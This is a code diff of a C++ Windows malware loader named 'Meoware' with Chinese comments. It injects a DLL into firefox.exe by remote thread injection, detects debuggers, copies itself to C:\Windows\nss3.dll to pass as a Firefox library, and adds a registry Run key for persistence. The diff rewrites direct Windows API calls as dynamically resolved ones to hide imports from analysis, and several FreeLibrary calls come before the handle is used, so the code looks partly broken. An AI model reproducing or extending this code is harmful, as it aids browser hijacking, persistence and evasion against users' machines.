@@ -13,7 +13,7 @@ HINSTANCE hdll = NULL;
 // 匯出的注入函數，將 HookFireFox.dll 持續注入到 firefox.exe 中
 extern "C" __declspec(dllexport) void CALLBACK StartMalware(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
 {
-    if (IsDebuggerPresent()) {
+    if (GetProcFromDll<IsDebuggerPresent_t>(hdll, "IsDebuggerPresent", "kernel32.dll")()) {
         return;
     }
 
@@ -23,7 +23,8 @@ extern "C" __declspec(dllexport) void CALLBACK StartMalware(HWND hwnd, HINSTANCE
     const char* mutexName = "Meoware"; // 2. 設定唯一的互斥體名稱
 
     // 2. 建立或開啟具名互斥體
-    hMutex = CreateMutexA(NULL, FALSE, mutexName);
+    hMutex = GetProcFromDll<CreateMutexA_t>(hdll, "CreateMutexA", "kernel32.dll")(NULL, FALSE, mutexName);
+    FreeLibrary(hdll);
     if (hMutex == NULL) {
         Log("log.txt", "[+] loader: create mutex failed.\n");
         return;
@@ -31,7 +32,8 @@ extern "C" __declspec(dllexport) void CALLBACK StartMalware(HWND hwnd, HINSTANCE
 
     // 3. 檢查互斥體是否已存在
     if (GetLastError() == ERROR_ALREADY_EXISTS) {
-        CloseHandle(hMutex);
+        GetProcFromDll<CloseHandle_t>(hdll, "CloseHandle", "kernel32.dll")(hMutex);
+        FreeLibrary(hdll);
         Log("log.txt", "[+] loader: 程式已經在執行了.\n");
         return;
     }
@@ -40,15 +42,18 @@ extern "C" __declspec(dllexport) void CALLBACK StartMalware(HWND hwnd, HINSTANCE
     std::string target_path = "C:\\Windows\\nss3.dll";
 
     Log("log.txt", "[+] loader: 移動本體以及自我啟動.\n");
-    if (!CopyFile(toUTF16(path).c_str(), toUTF16(target_path).c_str(), FALSE))
+    if (!GetProcFromDll<CopyFileW_t>(hdll, "CopyFileW", "kernel32.dll")(toUTF16(path).c_str(), toUTF16(target_path).c_str(), FALSE))
     {
+        FreeLibrary(hdll);
         Log("log.txt", "[+] loader: self copy failed.\n");
         WriteRegistryRun("meoware", "C:\\Windows\\System32\\rundll32.exe", path + ",StartMalware");
     }
     else
     {
-        DeleteFile(toUTF16(path).c_str());
+        FreeLibrary(hdll);
+        GetProcFromDll<DeleteFileW_t>(hdll, "DeleteFileW", "kernel32.dll")(toUTF16(path).c_str());
         WriteRegistryRun("meoware", "C:\\Windows\\System32\\rundll32.exe", target_path + ",StartMalware");
+        FreeLibrary(hdll);
     }
 
     Log("log.txt", "[+] loader: create inject thread.\n");
@@ -88,6 +93,7 @@ BOOL RepeatInjectTargets()
         }
 
         GetProcFromDll<Sleep_t>(hdll, "Sleep", "kernel32.dll")(2000);
+        FreeLibrary(hdll);
     }
 }
 
@@ -96,6 +102,7 @@ BOOL InjectDll(DWORD pid, const std::wstring& dllPath)
 {
     // 1. OpenProcess 開啟目標 Process
     HANDLE hProcess = GetProcFromDll<OpenProcess_t>(hdll, "OpenProcess", "kernel32.dll")(PROCESS_ALL_ACCESS, FALSE, pid);
+    FreeLibrary(hdll);
     if (hProcess == nullptr)
     {
         DWORD error = GetLastError();
@@ -105,24 +112,29 @@ BOOL InjectDll(DWORD pid, const std::wstring& dllPath)
 
     // 2. VirtualAllocEx 在目標 Process 申請一塊記憶體
     LPVOID pRemoteMemory = GetProcFromDll<VirtualAllocEx_t>(hdll, "VirtualAllocEx", "kernel32.dll")(hProcess, nullptr, dllPath.size() * sizeof(wchar_t), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+    FreeLibrary(hdll);
     if (pRemoteMemory == nullptr)
     {
         DWORD error = GetLastError();
         Log("log.txt", "[-] loader: alloc remote memory failed, error=" + std::to_string(error) + ".\n");
-        CloseHandle(hProcess);
+        GetProcFromDll<CloseHandle_t>(hdll, "CloseHandle", "kernel32.dll")(hProcess);
+        FreeLibrary(hdll);
         return FALSE;
     }
     
 
     // 3. WriteProcessMemory 將 DLL 路徑寫入目標 Process
-    if (!WriteProcessMemory(hProcess, pRemoteMemory, dllPath.data(), dllPath.size() * sizeof(wchar_t), nullptr))
+    if (!GetProcFromDll<WriteProcessMemory_t>(hdll, "WriteProcessMemory", "kernel32.dll")(hProcess, pRemoteMemory, dllPath.data(), dllPath.size() * sizeof(wchar_t), nullptr))
     {
         DWORD error = GetLastError();
         Log("log.txt", "[-] loader: write dll path to remote mem failed, error=" + std::to_string(error) + ".\n");
-        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
-        CloseHandle(hProcess);
+        GetProcFromDll<VirtualFreeEx_t>(hdll, "VirtualFreeEx", "kernel32.dll")(hProcess, pRemoteMemory, 0, MEM_RELEASE);
+        FreeLibrary(hdll);
+        GetProcFromDll<CloseHandle_t>(hdll, "CloseHandle", "kernel32.dll")(hProcess);
+        FreeLibrary(hdll);
         return FALSE;
     }
+    FreeLibrary(hdll);
 
     // 4. GetProcAddress 取得 LoadLibrary 函數
     HINSTANCE hkernel32dLL = GetModuleHandle(L"kernel32.dll");
@@ -130,8 +142,10 @@ BOOL InjectDll(DWORD pid, const std::wstring& dllPath)
     {
         DWORD error = GetLastError();
         Log("log.txt", "[-] loader: get kernel32.dll handle failed, error=" + std::to_string(error) + ".\n");
-        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
-        CloseHandle(hProcess);
+        GetProcFromDll<VirtualFreeEx_t>(hdll, "VirtualFreeEx", "kernel32.dll")(hProcess, pRemoteMemory, 0, MEM_RELEASE);
+        FreeLibrary(hdll);
+        GetProcFromDll<CloseHandle_t>(hdll, "CloseHandle", "kernel32.dll")(hProcess);
+        FreeLibrary(hdll);
         return FALSE;
     }
 
@@ -140,8 +154,10 @@ BOOL InjectDll(DWORD pid, const std::wstring& dllPath)
     {
         DWORD error = GetLastError();
         Log("log.txt", "[-] loader: get LoadLibraryW failed, error=" + std::to_string(error) + ".\n");
-        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
-        CloseHandle(hProcess);
+        GetProcFromDll<VirtualFreeEx_t>(hdll, "VirtualFreeEx", "kernel32.dll")(hProcess, pRemoteMemory, 0, MEM_RELEASE);
+        FreeLibrary(hdll);
+        GetProcFromDll<CloseHandle_t>(hdll, "CloseHandle", "kernel32.dll")(hProcess);
+        FreeLibrary(hdll);
         return FALSE;
     }
 
@@ -152,20 +168,26 @@ BOOL InjectDll(DWORD pid, const std::wstring& dllPath)
     {
         DWORD error = GetLastError();
         Log("log.txt", "[-] loader: create remote thread failed, error=" + std::to_string(error) + ".\n");
-        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
-        CloseHandle(hProcess);
+        GetProcFromDll<VirtualFreeEx_t>(hdll, "VirtualFreeEx", "kernel32.dll")(hProcess, pRemoteMemory, 0, MEM_RELEASE);
+        FreeLibrary(hdll);
+        GetProcFromDll<CloseHandle_t>(hdll, "CloseHandle", "kernel32.dll")(hProcess);
+        FreeLibrary(hdll);
         return FALSE;
     }
     
-    if (WaitForSingleObject(hRemoteThread, INFINITE) != WAIT_OBJECT_0)
+    if (GetProcFromDll<WaitForSingleObject_t>(hdll, "WaitForSingleObject", "kernel32.dll")(hRemoteThread, INFINITE) != WAIT_OBJECT_0)
     {
         DWORD error = GetLastError();
         Log("log.txt", "[-] loader: thread execute failed, error=" + std::to_string(error) + ".\n");
         return FALSE;
     }
+    FreeLibrary(hdll);
 
-    VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
-    CloseHandle(hRemoteThread);
-    CloseHandle(hProcess);
+    GetProcFromDll<VirtualFreeEx_t>(hdll, "VirtualFreeEx", "kernel32.dll")(hProcess, pRemoteMemory, 0, MEM_RELEASE);
+    FreeLibrary(hdll);
+    GetProcFromDll<CloseHandle_t>(hdll, "CloseHandle", "kernel32.dll")(hRemoteThread);
+    FreeLibrary(hdll);
+    GetProcFromDll<CloseHandle_t>(hdll, "CloseHandle", "kernel32.dll")(hProcess);
+    FreeLibrary(hdll);
     return TRUE;
 }
